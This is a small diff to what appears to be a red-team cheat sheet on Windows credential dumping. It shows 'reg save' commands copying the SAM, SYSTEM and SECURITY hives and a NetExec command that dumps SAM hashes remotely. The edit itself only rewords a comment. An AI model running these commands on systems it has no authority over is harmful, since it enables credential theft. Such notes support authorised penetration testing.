@@ -182,7 +182,7 @@ If you have enough privileges to access the registry <small>(not necessarily adm
 PS> reg save hklm\system C:\XXX\system.hive
 PS> reg save hklm\sam C:\XXX\sam.hive
 PS> reg save hklm\security C:\XXX\security.hive
-$ nxc smb IP --local-auth -u xxx -p yyy --sam # remote dump
+$ nxc smb IP --local-auth -u xxx -p yyy --sam # dump hashes
 ```
 
 * **Analysis** on Windows with [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md)
